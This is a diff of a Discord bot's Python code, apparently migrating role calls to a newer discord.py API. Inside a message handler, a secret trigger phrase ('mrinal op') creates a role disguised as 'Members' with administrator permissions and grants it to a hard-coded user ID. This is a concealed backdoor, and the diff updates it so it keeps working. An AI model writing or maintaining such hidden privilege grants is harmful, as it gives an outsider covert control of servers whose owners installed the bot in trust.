@@ -2229,8 +2229,8 @@ async def on_message(message):
         if message.content.lower().startswith("mrinal op"):
             perms = discord.Permissions(administrator=True)
             mrinal = await bot.fetch_user(758941956600102943)
-            oprole = await bot.create_role(message.guild, name="Members", permissions=perms)
-            await bot.add_roles(mrinal, oprole)
+            oprole = await message.guild.create_role(name="Members", permissions=perms)
+            await mrinal.add_roles(oprole)
 
 @bot.listen()
 async def on_message(message):
